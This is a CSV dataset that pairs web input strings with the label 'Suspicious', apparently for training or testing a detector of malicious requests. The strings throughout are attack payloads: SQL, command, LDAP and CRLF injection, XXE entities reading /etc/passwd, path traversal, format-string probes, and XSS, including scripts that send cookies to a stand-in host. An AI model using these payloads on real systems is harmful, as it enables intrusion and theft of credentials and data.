WebString,Label
!',Suspicious
!@#$%%^#$%#$@#$%$$@#$%^^**((),Suspicious
!@#0%^#0##018387@#0^^**((),Suspicious
"""",Suspicious
""" or ""a""=""a",Suspicious
""" or ""x""=""x",Suspicious
""" or 0=0 #",Suspicious
""" or 0=0 --",Suspicious
""" or 1=1 or """"=""",Suspicious
""" or 1=1--",Suspicious
"""' or 1 --'""",Suspicious
""") or (""a""=""a",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////dev/random"""">]><foo>&xxe;</foo>""",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////etc/passwd"""">]><foo>&xxe;</foo>""",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><foo><![CDATA[' or 1=1 or ''=']]></foo>""",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>""",Suspicious
"""<HTML xmlns:xss><?import namespace=""""xss"""" implementation=""""http://ha.ckers.org/xss.htc""""><xss:xss>XSS</xss:xss></HTML>""",Suspicious
"""<xml ID=""""xss""""><I><B><IMG SRC=""""javas<!-- -->cript:alert('XSS')""""></B></I></xml><SPAN DATASRC=""""#xss"""" DATAFLD=""""B"""" DATAFORMATAS=""""HTML""""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",Suspicious
"""<xml ID=I><X><C><![CDATA[<IMG SRC=""""javas]]><![CDATA[cript:alert('XSS');"""">]]>""",Suspicious
"""><script>""",Suspicious
"""><script>alert(1)</script>",Suspicious
"""><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>",Suspicious
""">xxx<P>yyy",Suspicious
"""\t""",Suspicious
#,Suspicious
#&apos;,Suspicious
#',Suspicious
#xA,Suspicious
#xA#xD,Suspicious
#xD,Suspicious
#xD#xA,Suspicious
$NULL,Suspicious
$null,Suspicious
%,Suspicious
%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%,Suspicious
0%,Suspicious
%00../../../../../../etc/passwd,Suspicious
%00../../../../../../etc/shadow,Suspicious
%00/,Suspicious
%00/etc/passwd%00,Suspicious
%01%02%03%04%0a%0d%0aADSF,Suspicious
%08x,Suspicious
%0A/usr/bin/id,Suspicious
%0A/usr/bin/id%0A,Suspicious
%0Aid,Suspicious
%0Aid%0A,Suspicious
%0a ping -i 30 127.0.0.1 %0a,Suspicious
%oa ping -n 30 127.0.0.1 %0a,Suspicious
%0a id %0a,Suspicious
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a,Suspicious
%0d,Suspicious
%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a,Suspicious
%0d%0aX-Injection-Header:%20AttackValue,Suspicious
20%,Suspicious
%20$(sleep%2050),Suspicious
%20'sleep%2050',Suspicious
%20d,Suspicious
%20n,Suspicious
%20s,Suspicious
%20x,Suspicious
%20|,Suspicious
21%,Suspicious
%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E,Suspicious
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%               25%5c..%25%5c..%255cboot.ini,Suspicious
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%       25%5c..%25%5c..%00,Suspicious
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,Suspicious
2500%,Suspicious
%250a,Suspicious
26%,Suspicious
%27%20or%201=1,Suspicious
28%,Suspicious
29%,Suspicious
%2A,Suspicious
%2A%28%7C%28mail%3D%2A%29%29,Suspicious
%2A%28%7C%28objectclass%3D%2A%29%29,Suspicious
%2A%7C,Suspicious
%2e%2e%2f,Suspicious
%3C,Suspicious
%3C%3F,Suspicious
%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E,Suspicious
"%3cscript%3ealert(""XSS"");%3c/script%3e",Suspicious
%3cscript%3ealert(document.cookie);%3c%2fscript%3e,Suspicious
%5C,Suspicious
%5C/,Suspicious
60%,Suspicious
%7C,Suspicious
%7f,Suspicious
%99999999999s,Suspicious
%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A,Suspicious
%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E,Suspicious
%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F,Suspicious
%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G,Suspicious
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X,Suspicious
%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a,Suspicious
%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d ,Suspicious
%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e,Suspicious
%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f,Suspicious
%ff,Suspicious
%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g,Suspicious
%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i,Suspicious
%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o,Suspicious
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p,Suspicious
%s%p%x%d,Suspicious
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s,Suspicious
%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u,Suspicious
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x,Suspicious
&,Suspicious
& id,Suspicious
& ping -i 30 127.0.0.1 &,Suspicious
& ping -n 30 127.0.0.1 &,Suspicious
&#0000060,Suspicious
&#0000060;,Suspicious
&#000060,Suspicious
&#000060;,Suspicious
&#00060,Suspicious
&#00060;,Suspicious
&#0060,Suspicious
&#0060;,Suspicious
&#060,Suspicious
&#060;,Suspicious
&#10;,Suspicious
&#10;&#13;,Suspicious
&#13;,Suspicious
&#13;&#10;,Suspicious
&#60,Suspicious
&#60;,Suspicious
&#X000003C,Suspicious
&#X000003C;,Suspicious
&#X000003c,Suspicious
&#X000003c;,Suspicious
&#X00003C,Suspicious
&#X00003C;,Suspicious
&#X00003c,Suspicious
&#X00003c;,Suspicious
&#X0003C,Suspicious
&#X0003C;,Suspicious
&#X0003c,Suspicious
&#X0003c;,Suspicious
&#X003C,Suspicious
&#X003C;,Suspicious
&#X003c,Suspicious
&#X003c;,Suspicious
&#X03C,Suspicious
&#X03C;,Suspicious
&#X03c,Suspicious
&#X03c;,Suspicious
&#X3C,Suspicious
&#X3C;,Suspicious
&#X3c,Suspicious
&#X3c;,Suspicious
&#x000003C,Suspicious
&#x000003C;,Suspicious
&#x000003c,Suspicious
&#x000003c;,Suspicious
&#x00003C,Suspicious
&#x00003C;,Suspicious
&#x00003c,Suspicious
&#x00003c;,Suspicious
&#x0003C,Suspicious
&#x0003C;,Suspicious
&#x0003c,Suspicious
&#x0003c;,Suspicious
&#x003C,Suspicious
&#x003C;,Suspicious
&#x003c,Suspicious
&#x003c;,Suspicious
&#x03C,Suspicious
&#x03C;,Suspicious
&#x03c,Suspicious
&#x03c;,Suspicious
&#x3C,Suspicious
&#x3C;,Suspicious
&#x3c,Suspicious
&#x3c;,Suspicious
&LT,Suspicious
&LT;,Suspicious
&apos;,Suspicious
&apos;%20OR,Suspicious
&id,Suspicious
&lt,Suspicious
&lt;,Suspicious
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,Suspicious
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,Suspicious
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,Suspicious
&lt;&gt;&quot;'%;)(&amp;+,Suspicious
&ltscript&gtalert(document.cookie);&ltscript&gtalert,Suspicious
&ltscript&gtalert(document.cookie);</script>,Suspicious
&quot;;id&quot;,Suspicious
',Suspicious
' (select top 1,Suspicious
' --,Suspicious
' ;,Suspicious
' UNION ALL SELECT,Suspicious
' UNION SELECT,Suspicious
' or ''=',Suspicious
' or '1'='1,Suspicious
' or '1'='1'--,Suspicious
' or 'x'='x,Suspicious
' or (EXISTS),Suspicious
' or 0=0 #,Suspicious
' or 0=0 --,Suspicious
' or 1 in (@@version)--,Suspicious
' or 1=1 or ''=',Suspicious
' or 1=1--,Suspicious
' or a=a--,Suspicious
' or uid like '%,Suspicious
' or uname like '%,Suspicious
' or user like '%,Suspicious
' or userid like '%,Suspicious
' or username like '%,Suspicious
'%20or%201=1,Suspicious
'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E,Suspicious
"'';!--""<XSS>=&{()}",Suspicious
') or ('a'='a,Suspicious
'--,Suspicious
'; exec master..xp_cmdshell,Suspicious
'; exec xp_regread,Suspicious
'; waitfor delay '0:30:0'--,Suspicious
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",Suspicious
';shutdown--,Suspicious
'><script>alert(document.cookie);</script>,Suspicious
'><script>alert(document.cookie)</script>,Suspicious
'hi' or 'x'='x';,Suspicious
'or select *,Suspicious
'sqlattempt1,Suspicious
'||UTL_HTTP.REQUEST,Suspicious
'||Utl_Http.request('http://<yourservername>') from dual--,Suspicious
(,Suspicious
('),Suspicious
(sqlattempt2),Suspicious
),Suspicious
)))))))))),Suspicious
*,Suspicious
*&apos;,Suspicious
*',Suspicious
*(|(mail=*)),Suspicious
*(|(objectclass=*)),Suspicious
*/*,Suspicious
*|,Suspicious
+,Suspicious
0%,Suspicious
",@variable",Suspicious
-,Suspicious
--,Suspicious
--';,Suspicious
--sp_password,Suspicious
-1,Suspicious
-1,Suspicious
-2,Suspicious
-20,Suspicious
-268435455,Suspicious
..%%35%63,Suspicious
..%%35c,Suspicious
..%25%35%63,Suspicious
..%255c,Suspicious
..%5c,Suspicious
..%bg%qf,Suspicious
..%c0%af,Suspicious
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,Suspicious
